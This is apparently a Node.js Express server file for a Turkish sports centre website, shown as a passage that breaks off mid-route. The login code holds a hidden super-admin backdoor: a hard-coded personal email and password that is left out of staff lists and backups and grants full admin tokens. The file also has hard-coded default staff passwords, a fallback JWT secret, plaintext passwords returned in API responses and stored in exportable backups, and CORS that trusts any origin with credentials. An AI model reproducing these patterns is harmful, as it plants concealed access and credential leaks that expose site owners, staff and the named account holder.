import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import compression from 'compression';
import cookieParser from 'cookie-parser';
import dotenv from 'dotenv';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import multer from 'multer';
import crypto from 'crypto';
import sharp from 'sharp';
import { execFile } from 'child_process';
import { promisify } from 'util';
import { PrismaClient } from '@prisma/client';
import {
  defaultAnnouncements,
  defaultAbout,
  defaultContent,
  defaultFacilityAreas,
  defaultGallery,
  defaultGalleryCategories,
  defaultAnalytics,
  defaultPackages,
  defaultPosts,
  defaultServices,
  defaultTestimonials,
  defaultTrainers
} from '../shared/defaults.js';
import { canManageStaffUsers, isAdminRole, isStaffRole } from '../shared/admin-permissions.js';
import {
  SITE_BACKUP_EXTENSION,
  SITE_BACKUP_KEYS,
  createSiteBackupEnvelope,
  parseSiteBackupPayload,
  pickSiteBackupData
} from '../shared/site-backup.js';
import {
  createPersistencePaths,
  ensurePersistenceDirs,
  isSettingsEmpty,
  readJsonFile,
  writeJsonFile
} from '../shared/persistence.js';
import { generateRobotsTxt, generateSitemapXml } from '../shared/sitemap-generator.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.resolve(__dirname, '..');
const isRailway = Boolean(
  process.env.RAILWAY_ENVIRONMENT ||
  process.env.RAILWAY_PROJECT_ID ||
  process.env.RAILWAY_SERVICE_ID
);
const isProduction = process.env.NODE_ENV === 'production' || isRailway;
const envPath = path.join(rootDir, '.env');

if (!isProduction) {
  if (fs.existsSync(envPath)) {
    dotenv.config({ path: envPath, override: true });
  } else {
    dotenv.config();
  }
}

const prisma = new PrismaClient();
const execFileAsync = promisify(execFile);
const app = express();
let dbReady = false;

app.get('/api/health', (_, res) => {
  res.status(200).json({
    ok: true,
    service: 'peakspor',
    dbReady,
    env: process.env.NODE_ENV || 'development'
  });
});
const persistencePaths = createPersistencePaths(rootDir);
ensurePersistenceDirs(persistencePaths);
const uploadDir = persistencePaths.uploadDir;
const settingsBackupPath = persistencePaths.settingsBackupPath;
const siteBackupsDir = persistencePaths.siteBackupsDir;
const staffUsersBackupPath = persistencePaths.staffUsersBackupPath;
const uploadManifestPath = persistencePaths.uploadManifestPath;
const MAX_AUTO_SITE_BACKUPS = 30;
let autoSiteBackupTimer = null;
let autoSiteBackupInFlight = false;
let lastAutoSiteBackupAt = 0;
const AUTO_SITE_BACKUP_MIN_MS = 5 * 60 * 1000;
let restoreSiteBackupInProgress = false;

if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

function migrateLegacyUploads() {
  const legacyDir = persistencePaths.legacyUploadDir;
  if (!fs.existsSync(legacyDir)) return;
  for (const name of fs.readdirSync(legacyDir)) {
    const source = path.join(legacyDir, name);
    if (!fs.statSync(source).isFile()) continue;
    const target = path.join(uploadDir, name);
    if (!fs.existsSync(target)) {
      fs.copyFileSync(source, target);
      registerUploadedFile(name, { migrated: true, originalName: name });
    }
  }
}

function readUploadManifest() {
  return readJsonFile(uploadManifestPath, { files: {}, updatedAt: null });
}

function registerUploadedFile(filename, meta = {}) {
  const manifest = readUploadManifest();
  manifest.files = manifest.files || {};
  manifest.files[filename] = {
    url: `/uploads/${filename}`,
    createdAt: new Date().toISOString(),
    ...meta
  };
  manifest.updatedAt = new Date().toISOString();
  writeJsonFile(uploadManifestPath, manifest);
}

function removeUploadedFile(filename) {
  const safeName = path.basename(String(filename || ''));
  if (!safeName || safeName.includes('..')) return false;
  const filePath = path.join(uploadDir, safeName);
  if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
  const manifest = readUploadManifest();
  if (manifest.files?.[safeName]) {
    delete manifest.files[safeName];
    manifest.updatedAt = new Date().toISOString();
    writeJsonFile(uploadManifestPath, manifest);
  }
  return true;
}

async function readStaffUsersForBackup() {
  const hiddenEmail = getHiddenSuperAdmin().email;
  return prisma.user.findMany({
    where: {
      role: { in: ['ADMIN', 'MODERATOR'] },
      email: { not: hiddenEmail }
    },
    orderBy: { createdAt: 'asc' },
    select: {
      name: true,
      email: true,
      username: true,
      passwordHash: true,
      passwordPlain: true,
      role: true
    }
  });
}

async function syncStaffUsersToFile() {
  try {
    const users = await readStaffUsersForBackup();
    writeJsonFile(staffUsersBackupPath, {
      updatedAt: new Date().toISOString(),
      users
    });
  } catch (error) {
    console.warn('Staff users file sync failed:', error.message);
  }
}

async function hydrateStaffUsersFromFile() {
  const backup = readJsonFile(staffUsersBackupPath, null);
  if (!backup?.users?.length) return;

  for (const user of backup.users) {
    if (!user?.email || isHiddenSuperAdminEmail(user.email)) continue;
    const email = String(user.email).trim().toLowerCase();
    const existing = await prisma.user.findUnique({ where: { email } });
    if (existing) continue;
    await prisma.user.create({
      data: {
        name: user.name || 'Yetkili',
        email,
        username: user.username ? String(user.username).trim().toLowerCase() : null,
        passwordHash: user.passwordHash,
        passwordPlain: user.passwordPlain || null,
        role: user.role === 'MODERATOR' ? 'MODERATOR' : 'ADMIN'
      }
    });
  }
}

async function restoreStaffUsersFromBackup(users = []) {
  if (!Array.isArray(users) || !users.length) return;
  for (const user of users) {
    if (!user?.email || isHiddenSuperAdminEmail(user.email)) continue;
    const email = String(user.email).trim().toLowerCase();
    const data = {
      name: user.name || 'Yetkili',
      email,
      username: user.username ? String(user.username).trim().toLowerCase() : null,
      passwordHash: user.passwordHash,
      passwordPlain: user.passwordPlain || null,
      role: user.role === 'MODERATOR' ? 'MODERATOR' : 'ADMIN'
    };
    const existing = await prisma.user.findUnique({ where: { email } });
    if (existing) {
      await prisma.user.update({ where: { email }, data });
    } else {
      await prisma.user.create({ data });
    }
  }
  await syncStaffUsersToFile();
}

async function syncPersistentStoreOnBoot() {
  migrateLegacyUploads();

  const fileSettings = readSettingsBackup();
  let dbSettings = {};
  try {
    dbSettings = await readAllSettingsMap();
  } catch {
    dbSettings = {};
  }

  if (!isSettingsEmpty(fileSettings)) {
    for (const key of SITE_BACKUP_KEYS) {
      if (key === 'staffUsers' || fileSettings[key] === undefined) continue;
      if (dbSettings[key] === undefined) {
        await prisma.setting.upsert({
          where: { key },
          create: { key, value: fileSettings[key] },
          update: { value: fileSettings[key] }
        });
      }
    }
    dbSettings = await readAllSettingsMap();
  }

  writeSettingsBackup(dbSettings);
  await hydrateStaffUsersFromFile();
  await syncStaffUsersToFile();
  console.log(`Persistent store ready at ${persistencePaths.dataRoot}`);
}

function isRasterUpload(file) {
  const mime = String(file.mimetype || '').toLowerCase();
  if (mime === 'image/svg+xml') return false;
  if (mime.startsWith('image/')) return true;
  const ext = path.extname(file.originalname || '').toLowerCase();
  return ['.jpg', '.jpeg', '.png', '.webp', '.gif', '.heic', '.heif', '.avif', '.tiff', '.tif', '.bmp'].includes(ext);
}

async function normalizeUploadedImage(file) {
  if (!isRasterUpload(file)) return file.filename;

  const baseName = path.basename(file.filename, path.extname(file.filename));
  const jpgName = `${baseName}.jpg`;
  const jpgPath = path.join(uploadDir, jpgName);

  await sharp(file.path, { failOn: 'none' })
    .rotate()
    .jpeg({ quality: 86, mozjpeg: true })
    .toFile(jpgPath);

  if (jpgPath !== file.path && fs.existsSync(file.path)) {
    fs.unlinkSync(file.path);
  }

  return jpgName;
}

const port = Number(process.env.PORT) || 8080;
const jwtSecret = process.env.JWT_SECRET || 'peakspor-secret';

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: true, credentials: true }));
app.use(compression());
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

app.use('/uploads', (req, res, next) => {
  if (req.method !== 'GET' && req.method !== 'HEAD') return next();

  const rawName = path.basename(decodeURIComponent(req.path || ''));
  if (!rawName || rawName.includes('..')) return next();

  const filePath = path.join(uploadDir, rawName);
  if (fs.existsSync(filePath)) {
    if (/\.jpe?g$/i.test(rawName)) res.type('image/jpeg');
    else if (/\.png$/i.test(rawName)) res.type('image/png');
    else if (/\.webp$/i.test(rawName)) res.type('image/webp');
    else if (/\.gif$/i.test(rawName)) res.type('image/gif');
    return next();
  }

  const legacyMatch = rawName.match(/^(.+)\.(heic|heif|png|webp|avif)$/i);
  if (legacyMatch) {
    const jpgPath = path.join(uploadDir, `${legacyMatch[1]}.jpg`);
    if (fs.existsSync(jpgPath)) {
      return res.type('image/jpeg').sendFile(jpgPath);
    }
  }

  next();
}, express.static(uploadDir, {
  setHeaders(res, filePath) {
    if (/\.jpe?g$/i.test(filePath)) res.setHeader('Content-Type', 'image/jpeg');
  }
}));

const authCookieOptions = {
  httpOnly: true,
  sameSite: 'lax',
  secure: process.env.NODE_ENV === 'production' || process.env.COOKIE_SECURE === 'true'
};

function getConfiguredAdminEmail() {
  return (process.env.ADMIN_EMAIL || 'admin@peakspor.com').trim().toLowerCase();
}

function resolveAdminEmail(value) {
  const input = (value || '').trim().toLowerCase();
  const configured = getConfiguredAdminEmail();
  if (!input || input === 'admin') return configured;
  return input;
}

function getAdminCredentials() {
  return {
    email: getConfiguredAdminEmail(),
    password: process.env.ADMIN_PASSWORD || 'Admin1234!'
  };
}

function getHiddenSuperAdmin() {
  return {
    email: (process.env.SUPER_ADMIN_EMAIL || 'erhanyaman001@gmail.com').trim().toLowerCase(),
    password: process.env.SUPER_ADMIN_PASSWORD || 'yamann01As'
  };
}

function isHiddenSuperAdminEmail(email) {
  return (email || '').trim().toLowerCase() === getHiddenSuperAdmin().email;
}

const HIDDEN_SUPER_ADMIN_ID = 'hidden-super-admin';

function createHiddenSuperAdminSession() {
  const hidden = getHiddenSuperAdmin();
  return {
    id: HIDDEN_SUPER_ADMIN_ID,
    name: 'Peakspor Admin',
    email: hidden.email,
    role: 'ADMIN'
  };
}

function getBuiltinStaffAccounts() {
  const { email: adminEmail, password: adminPassword } = getAdminCredentials();
  return [
    {
      id: 'builtin-admin',
      name: 'Peakspor Admin',
      email: adminEmail,
      username: 'admin',
      password: adminPassword,
      role: 'ADMIN'
    },
    {
      id: 'builtin-moderator',
      name: 'Moderatör',
      email: 'moderator@peakspor.com',
      username: 'moderator',
      password: 'PeakMod2026!',
      role: 'MODERATOR'
    }
  ];
}

function matchBuiltinStaff(loginInput, password) {
  const login = (loginInput || '').trim().toLowerCase();
  const inputPassword = password || '';
  if (!login || !inputPassword) return null;

  return getBuiltinStaffAccounts().find(account => {
    const emailMatch = account.email.toLowerCase() === login;
    const usernameMatch = account.username?.toLowerCase() === login;
    const adminAlias = login === 'admin' && account.username === 'admin';
    return (emailMatch || usernameMatch || adminAlias) && account.password === inputPassword;
  }) || null;
}

function createBuiltinStaffSession(account) {
  return {
    id: account.id,
    name: account.name,
    email: account.email,
    username: account.username,
    role: account.role
  };
}

async function findUserByLogin(login) {
  const normalized = (login || '').trim().toLowerCase();
  if (!normalized) return null;
  let user = await prisma.user.findUnique({ where: { email: normalized } });
  if (!user) {
    user = await prisma.user.findUnique({ where: { username: normalized } });
  }
  return user;
}

async function ensureAdminUser(email, password) {
  const passwordHash = await bcrypt.hash(password, 10);
  return prisma.user.upsert({
    where: { email },
    create: {
      name: 'Peakspor Admin',
      email,
      username: 'admin',
      passwordHash,
      passwordPlain: password,
      role: 'ADMIN'
    },
    update: {
      name: 'Peakspor Admin',
      passwordHash,
      passwordPlain: password,
      role: 'ADMIN'
    }
  });
}

async function ensureModeratorUser() {
  const email = 'moderator@peakspor.com';
  const username = 'moderator';
  const password = 'PeakMod2026!';
  const exists = await prisma.user.findFirst({
    where: { OR: [{ email }, { username }] }
  });
  if (exists) {
    return prisma.user.update({
      where: { id: exists.id },
      data: {
        name: 'Moderatör',
        email,
        username,
        role: 'MODERATOR',
        passwordHash: await bcrypt.hash(password, 10),
        passwordPlain: password
      }
    });
  }
  return prisma.user.create({
    data: {
      name: 'Moderatör',
      email,
      username,
      passwordHash: await bcrypt.hash(password, 10),
      passwordPlain: password,
      role: 'MODERATOR'
    }
  });
}

const storage = multer.diskStorage({
  destination: (_, __, cb) => cb(null, uploadDir),
  filename: (_, file, cb) => {
    const unique = `${Date.now()}-${Math.round(Math.random() * 1e9)}`;
    cb(null, `${unique}-${file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_')}`);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 100 * 1024 * 1024 }
});

function readSettingsBackup() {
  try {
    if (fs.existsSync(settingsBackupPath)) {
      return JSON.parse(fs.readFileSync(settingsBackupPath, 'utf8'));
    }
  } catch (error) {
    console.warn('Settings backup read failed:', error.message);
  }
  return {};
}

function writeSettingsBackup(allSettings) {
  try {
    const dir = path.dirname(settingsBackupPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(settingsBackupPath, JSON.stringify(allSettings, null, 2));
  } catch (error) {
    console.warn('Settings backup write failed:', error.message);
  }
}

function ensureSiteBackupsDir() {
  if (!fs.existsSync(siteBackupsDir)) fs.mkdirSync(siteBackupsDir, { recursive: true });
}

function sanitizeBackupFilename(name = '') {
  const base = path.basename(String(name));
  if (!/^[a-zA-Z0-9._-]+\.(peakspor|json)$/i.test(base)) return null;
  return base;
}

function readSiteBackupFileMeta(filename) {
  const safeName = sanitizeBackupFilename(filename);
  if (!safeName) return null;
  const filePath = path.join(siteBackupsDir, safeName);
  if (!fs.existsSync(filePath)) return null;
  try {
    const parsed = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    const stats = fs.statSync(filePath);
    return {
      id: safeName,
      filename: safeName,
      createdAt: parsed.createdAt || stats.mtime.toISOString(),
      label: parsed.label || '',
      kind: parsed.kind || (safeName.startsWith('auto-') ? 'auto' : 'manual'),
      size: stats.size,
      sections: Object.keys(pickSiteBackupData(parsed.data || parsed)).length
    };
  } catch {
    return null;
  }
}

function listStoredSiteBackups() {
  ensureSiteBackupsDir();
  return fs
    .readdirSync(siteBackupsDir)
    .filter(name => /\.(peakspor|json)$/i.test(name))
    .map(name => readSiteBackupFileMeta(name))
    .filter(Boolean)
    .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
}

function pruneAutoSiteBackups() {
  const autoBackups = listStoredSiteBackups().filter(item => item.kind === 'auto');
  if (autoBackups.length <= MAX_AUTO_SITE_BACKUPS) return;
  autoBackups.slice(MAX_AUTO_SITE_BACKUPS).forEach(item => {
    try {
      fs.unlinkSync(path.join(siteBackupsDir, item.filename));
    } catch {
      // ignore delete errors
    }
  });
}

async function createStoredSiteBackup(kind = 'manual', settingsMap = null, label = '') {
  ensureSiteBackupsDir();
  const settings = settingsMap || (await buildFullBackupSettings());
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const prefix = kind === 'auto' ? 'auto' : 'manual';
  const filename = `${prefix}-${stamp}${SITE_BACKUP_EXTENSION}`;
  const envelope = createSiteBackupEnvelope(settings, { kind, label });
  fs.writeFileSync(path.join(siteBackupsDir, filename), JSON.stringify(envelope, null, 2));
  if (kind === 'auto') pruneAutoSiteBackups();
  return readSiteBackupFileMeta(filename);
}

function scheduleAutoSiteBackup(settingsMap) {
  if (restoreSiteBackupInProgress) return;
  const now = Date.now();
  if (now - lastAutoSiteBackupAt < AUTO_SITE_BACKUP_MIN_MS) return;
  if (autoSiteBackupTimer) clearTimeout(autoSiteBackupTimer);
  autoSiteBackupTimer = setTimeout(async () => {
    if (autoSiteBackupInFlight || restoreSiteBackupInProgress) return;
    autoSiteBackupInFlight = true;
    try {
      await createStoredSiteBackup('auto', await buildFullBackupSettings());
      lastAutoSiteBackupAt = Date.now();
    } catch (error) {
      console.warn('Auto site backup failed:', error.message);
    } finally {
      autoSiteBackupInFlight = false;
    }
  }, 4000);
}

async function buildFullBackupSettings() {
  const settings = await readAllSettingsMap().catch(() => readSettingsBackup());
  settings.staffUsers = await readStaffUsersForBackup();
  return settings;
}

async function restoreSiteBackupData(data) {
  restoreSiteBackupInProgress = true;
  try {
    const merged = await readAllSettingsMap().catch(() => readSettingsBackup());
    const staffUsers = data.staffUsers;
    for (const key of SITE_BACKUP_KEYS) {
      if (key === 'staffUsers' || data[key] === undefined) continue;
      await prisma.setting.upsert({
        where: { key },
        create: { key, value: data[key] },
        update: { value: data[key] }
      });
      merged[key] = data[key];
    }
    writeSettingsBackup(merged);
    if (staffUsers) await restoreStaffUsersFromBackup(staffUsers);
    return merged;
  } finally {
    restoreSiteBackupInProgress = false;
  }
}

async function readAllSettingsMap() {
  const entries = await prisma.setting.findMany();
  return Object.fromEntries(entries.map(item => [item.key, item.value]));
}

async function persistSettingValue(key, value) {
  const setting = await prisma.setting.upsert({
    where: { key },
    create: { key, value },
    update: { value }
  });

  let backup = {};
  try {
    backup = await readAllSettingsMap();
  } catch {
    backup = readSettingsBackup();
  }
  backup[key] = value;
  writeSettingsBackup(backup);
  if (!restoreSiteBackupInProgress) scheduleAutoSiteBackup(backup);
  return setting;
}

function signToken(user) {
  return jwt.sign(
    { id: user.id, email: user.email, role: user.role, name: user.name },
    jwtSecret,
    { expiresIn: '7d' }
  );
}

function getTokenFromRequest(req) {
  const bearer = req.headers.authorization?.startsWith('Bearer ')
    ? req.headers.authorization.slice(7)
    : null;
  return bearer || req.cookies.token || null;
}

async function authRequired(req, res, next) {
  const token = getTokenFromRequest(req);
  if (!token) return res.status(401).json({ message: 'Yetkisiz erişim' });

  try {
    req.user = jwt.verify(token, jwtSecret);
    next();
  } catch {
    res.status(401).json({ message: 'Geçersiz oturum' });
  }
}

async function staffRequired(req, res, next) {
  const token = getTokenFromRequest(req);
  if (!token) return res.status(401).json({ message: 'Yetkisiz erişim' });
  try {
    req.user = jwt.verify(token, jwtSecret);
  } catch {
    return res.status(401).json({ message: 'Geçersiz oturum' });
  }
  if (!isStaffRole(req.user.role)) {
    return res.status(403).json({ message: 'Yetersiz yetki' });
  }
  next();
}

async function adminOnlyRequired(req, res, next) {
  const token = getTokenFromRequest(req);
  if (!token) return res.status(401).json({ message: 'Yetkisiz erişim' });
  try {
    req.user = jwt.verify(token, jwtSecret);
  } catch {
    return res.status(401).json({ message: 'Geçersiz oturum' });
  }
  if (req.user.role !== 'ADMIN') {
    return res.status(403).json({ message: 'Yetersiz yetki' });
  }
  next();
}

async function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function connectDatabase(retries = 10) {
  for (let attempt = 1; attempt <= retries; attempt += 1) {
    try {
      await prisma.$connect();
      console.log('Database connected');
      return;
    } catch (error) {
      console.warn(`Database connect attempt ${attempt}/${retries} failed:`, error.message);
      if (attempt === retries) throw error;
      await wait(2000 * attempt);
    }
  }
}

async function pushDatabaseSchema(timeoutMs = 45000) {
  try {
    const prismaCli = path.join(rootDir, 'node_modules', 'prisma', 'build', 'index.js');
    if (!fs.existsSync(prismaCli)) {
      console.warn('Prisma CLI not found, skipping schema push');
      return;
    }

    const pushArgs = ['db', 'push', '--skip-generate'];
    if (isRailway || isProduction) {
      pushArgs.push('--accept-data-loss');
    }

    await Promise.race([
      execFileAsync(process.execPath, [prismaCli, ...pushArgs], {
        cwd: rootDir,
        env: process.env
      }),
      new Promise((_, reject) => {
        setTimeout(() => reject(new Error('schema push timeout')), timeoutMs);
      })
    ]);
    console.log('Database schema synced');
  } catch (error) {
    const message = error.stderr || error.message || 'unknown error';
    console.warn('Database schema sync skipped:', message);
  }
}

async function ensureSeedData() {
  const { email: adminEmail, password: adminPassword } = getAdminCredentials();
  try {
    await ensureAdminUser(adminEmail, adminPassword);
  } catch (error) {
    console.warn('Admin user seed skipped:', error.message || error);
  }
  try {
    await ensureModeratorUser();
  } catch (error) {
    console.warn('Moderator user seed skipped:', error.message || error);
  }

  const settings = [
    ['content', defaultContent],
    ['services', defaultServices],
    ['packages', defaultPackages],
    ['gallery', defaultGallery],
    ['announcements', defaultAnnouncements],
    ['trainers', defaultTrainers],
    ['about', defaultAbout],
    ['testimonials', defaultTestimonials],
    ['facilityAreas', defaultFacilityAreas],
    ['galleryCategories', defaultGalleryCategories],
    ['analytics', defaultAnalytics]
  ];

  for (const [key, value] of settings) {
    const exists = await prisma.setting.findUnique({ where: { key } });
    if (!exists) {
      await prisma.setting.create({ data: { key, value } });
    }
  }

  if (!(await prisma.service.count())) {
    try {
      await prisma.service.createMany({ data: defaultServices });
    } catch (error) {
      console.warn('Default services seed skipped:', error.message);
    }
  }
  if (!(await prisma.package.count())) {
    try {
      await prisma.package.createMany({ data: defaultPackages.map(item => ({
        ...item,
        features: item.features
      })) });
    } catch (error) {
      console.warn('Default packages seed skipped:', error.message);
    }
  }
  if (!(await prisma.galleryItem.count())) {
    try {
      await prisma.galleryItem.createMany({ data: defaultGallery });
    } catch (error) {
      console.warn('Default gallery seed skipped:', error.message);
    }
  }
  if (!(await prisma.announcement.count())) {
    try {
      await prisma.announcement.createMany({
        data: defaultAnnouncements.map(message => ({ message }))
      });
    } catch (error) {
      console.warn('Default announcements seed skipped:', error.message);
    }
  }
  if (!(await prisma.trainer.count())) {
    try {
      await prisma.trainer.createMany({ data: defaultTrainers });
    } catch (error) {
      console.warn('Default trainers seed skipped:', error.message);
    }
  }
  if (!(await prisma.blogPost.count())) {
    try {
      await prisma.blogPost.createMany({ data: defaultPosts });
    } catch (error) {
      console.warn('Default posts seed skipped:', error.message);
    }
  }
}

app.get('/api/public-config', (_, res) => {
  res.json({
    gaMeasurementId: process.env.VITE_GA_MEASUREMENT_ID || process.env.GA_MEASUREMENT_ID || '',
    googleSiteVerification: (process.env.GOOGLE_SITE_VERIFICATION || '').trim()
  });
});

app.get('/api/seo/verification', (_, res) => {
  const token = (process.env.GOOGLE_SITE_VERIFICATION || '').trim();
  res.json({
    domain: 'peaksportcenter.online',
    verification: {
      dns: token
        ? {
            type: 'TXT',
            host: '@',
            name: 'peaksportcenter.online',
            value: `google-site-verification=${token}`,
            providerSteps: [
              'Domain DNS panelinize (Cloudflare vb.) gidin.',
              'Yeni TXT kaydı ekleyin.',
              'Host/Name alanına @ veya peaksportcenter.online yazın.',
              `Value alanına google-site-verification=${token} yazın.`,
              'DNS yayılımından sonra Google Search Console\'da doğrulayın.'
            ]
          }
        : null,
      meta: token ? { name: 'google-site-verification', content: token } : null
    }
  });
});

app.get('/sitemap.xml', (_, res) => {
  res.type('application/xml; charset=utf-8').send(generateSitemapXml());
});

app.get('/robots.txt', (_, res) => {
  res.type('text/plain; charset=utf-8').send(generateRobotsTxt());
});

app.get('/google30e5718b72004853.html', (_, res) => {
  res.type('text/html; charset=utf-8').send('google-site-verification: google30e5718b72004853.html\n');
});

app.get('/site.webmanifest', (_, res) => {
  const manifestPath = path.join(rootDir, 'dist', 'site.webmanifest');
  const fallbackPath = path.join(rootDir, 'public', 'site.webmanifest');
  const target = fs.existsSync(manifestPath) ? manifestPath : fallbackPath;
  if (!fs.existsSync(target)) {
    return res.status(404).type('text/plain').send('Manifest not found');
  }
  res.type('application/manifest+json; charset=utf-8').sendFile(target);
});

app.get('/api/me', authRequired, async (req, res) => {
  if (req.user.id === HIDDEN_SUPER_ADMIN_ID) {
    const session = createHiddenSuperAdminSession();
    return res.json({
      user: { id: session.id, name: session.name, email: session.email, role: session.role }
    });
  }

  const builtin = getBuiltinStaffAccounts().find(
    account => account.id === req.user.id || account.email === req.user.email
  );
  if (builtin) {
    return res.json({
      user: {
        id: req.user.id,
        name: builtin.name,
        email: builtin.email,
        username: builtin.username,
        passwordPlain: builtin.password,
        role: builtin.role
      }
    });
  }

  const user = await prisma.user.findUnique({
    where: { id: req.user.id },
    select: { id: true, name: true, email: true, username: true, passwordPlain: true, role: true, createdAt: true }
  });
  if (!user) return res.status(401).json({ message: 'Geçersiz oturum' });
  res.json({ user });
});

app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const loginInput = (email || '').trim();
    const inputPassword = password || '';
    const hidden = getHiddenSuperAdmin();
    const lookupEmail = resolveAdminEmail(loginInput).toLowerCase();

    if (lookupEmail === hidden.email && inputPassword === hidden.password) {
      const user = createHiddenSuperAdminSession();
      const token = signToken(user);
      res.cookie('token', token, authCookieOptions);
      return res.json({
        token,
        user: { id: user.id, name: user.name, email: user.email, role: user.role }
      });
    }

    const { email: adminEmail, password: adminPassword } = getAdminCredentials();
    const isKnownAdminLogin =
      lookupEmail === adminEmail.toLowerCase() && inputPassword === adminPassword;

    const builtin = matchBuiltinStaff(loginInput, inputPassword);

    let user;
    if (isKnownAdminLogin || (builtin && builtin.role === 'ADMIN')) {
      try {
        user = await ensureAdminUser(adminEmail, adminPassword);
      } catch (dbError) {
        console.warn('Admin DB sync failed, using built-in admin session:', dbError.message);
        user = createBuiltinStaffSession(getBuiltinStaffAccounts()[0]);
      }
    } else if (builtin && builtin.role === 'MODERATOR') {
      try {
        user = await ensureModeratorUser();
      } catch (dbError) {
        console.warn('Moderator DB sync failed, using built-in moderator session:', dbError.message);
        user = createBuiltinStaffSession(builtin);
      }
    } else {
      try {
        user = await findUserByLogin(loginInput);
        if (user && (await bcrypt.compare(inputPassword, user.passwordHash))) {
          if (!isStaffRole(user.role)) {
            return res.status(400).json({ message: 'Bu hesap yönetici yetkisine sahip değil.' });
          }
        } else {
          user = null;
        }
      } catch (dbError) {
        console.warn('Staff DB lookup failed:', dbError.message);
        user = null;
      }
    }

    if (!user) {
      return res.status(400).json({ message: 'E-posta veya şifre hatalı' });
    }

    const token = signToken(user);
    res.cookie('token', token, authCookieOptions);
    res.json({
      token,
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        username: user.username,
        passwordPlain: user.passwordPlain,
        role: user.role
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Giriş sırasında sunucu hatası oluştu' });
  }
});

app.post('/api/auth/logout', (_, res) => {
  res.clearCookie('token');
  res.json({ ok: true });
});

app.get('/api/content', async (_, res) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
  try {
    const content = await readAllSettingsMap();
    if (Object.keys(content).length) {
      return res.json(content);
    }
  } catch (error) {
    console.warn('Settings DB read failed:', error.message);
  }
  res.json(readSettingsBackup());
});

async function readAnalytics() {
  const row = await prisma.setting.findUnique({ where: { key: 'analytics' } });
  const base = { ...defaultAnalytics, ...(row?.value || {}) };
  return {
    ...base,
    visitorIds: Array.isArray(base.visitorIds) ? base.visitorIds : []
  };
}

async function writeAnalytics(value) {
  return prisma.setting.upsert({
    where: { key: 'analytics' },
    create: { key: 'analytics', value },
    update: { value }
  });
}

app.post('/api/analytics/visit', async (req, res) => {
  try {
    const { visitorId, path = '/' } = req.body || {};
    const analytics = await readAnalytics();
    analytics.totalVisits = Number(analytics.totalVisits || 0) + 1;
    const day = new Date().toISOString().slice(0, 10);
    analytics.visitsByDay = { ...(analytics.visitsByDay || {}), [day]: (analytics.visitsByDay?.[day] || 0) + 1 };
    analytics.pageViews = { ...(analytics.pageViews || {}), [path]: (analytics.pageViews?.[path] || 0) + 1 };
    if (visitorId) {
      const ids = new Set(analytics.visitorIds || []);
      ids.add(visitorId);
      analytics.visitorIds = [...ids].slice(-5000);
      analytics.uniqueVisitors = analytics.visitorIds.length;
    }
    await writeAnalytics(analytics);
    res.json({ ok: true });
  } catch (error) {
    console.error('Analytics visit error:', error);
    res.json({ ok: false });
  }
});

app.post('/api/analytics/click', async (req, res) => {
  try {
    const { target = 'unknown' } = req.body || {};
    const analytics = await readAnalytics();
    analytics.totalClicks = Number(analytics.totalClicks || 0) + 1;
    analytics.clicksByTarget = {
      ...(analytics.clicksByTarget || {}),
      [target]: (analytics.clicksByTarget?.[target] || 0) + 1
    };
    await writeAnalytics(analytics);
    res.json({ ok: true });
  } catch (error) {
    console.error('Analytics click error:', error);
    res.json({ ok: false });
  }
});

app.get('/api/admin/analytics', staffRequired, async (_, res) => {
  res.json(await readAnalytics());
});

app.get('/api/admin/site-backups', staffRequired, async (_, res) => {
  try {
    res.json({ backups: listStoredSiteBackups() });
  } catch (error) {
    console.error('Site backup list failed:', error);
    res.status(500).json({ message: 'Yedek listesi alınamadı' });
  }
});

app.get('/api/admin/site-backups/export', staffRequired, async (_, res) => {
  try {
    const settings = await buildFullBackupSettings();
    const envelope = createSiteBackupEnvelope(settings, { kind: 'export', label: 'Dışa aktarım' });
    res.json(envelope);
  } catch (error) {
    console.error('Site backup export failed:', error);
    res.status(500).json({ message: 'Yedek oluşturulamadı' });
  }
});

app.post('/api/admin/site-backups', staffRequired, async (req, res) => {
  try {
    const label = String(req.body?.label || '').trim();
    const settings = await buildFullBackupSettings();
    const backup = await createStoredSiteBackup('manual', settings, label);
    res.json({ ok: true, backup, backups: listStoredSiteBackups() });
  } catch (error) {
    console.error('Site backup save failed:', error);
    res.status(500).json({ message: 'Yedek kaydedilemedi' });
  }
});

app.get('/api/admin/site-backups/:filename/download', staffRequired, async (req, res) => {
  try {
    const safeName = sanitizeBackupFilename(req.params.filename);
    if (!safeName) return res.status(400).json({ message: 'Geçersiz yedek dosyası' });
    const filePath = path.join(siteBackupsDir, safeName);
    if (!fs.existsSync(filePath)) return res.status(404).json({ message: 'Yedek bulunamadı' });
    res.setHeader('Content-Type', 'application/json; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="${safeName}"`);
    res.sendFile(filePath);
  } catch (error) {
    console.error('Site backup download failed:', error);
    res.status(500).json({ message: 'Yedek indirilemedi' });
  }
});

app.post('/api/admin/site-backups/restore', staffRequired, async (req, res) => {
  try {
    const { payload, filename } = req.body || {};
    let data = null;

    if (filename) {
      const safeName = sanitizeBackupFilename(filename);
      if (!safeName) return res.status(400).json({ message: 'Geçersiz yedek dosyası' });
      const filePath = path.join(siteBackupsDir, safeName);
      if (!fs.existsSync(filePath)) return res.status(404).json({ message: 'Yedek bulunamadı' });
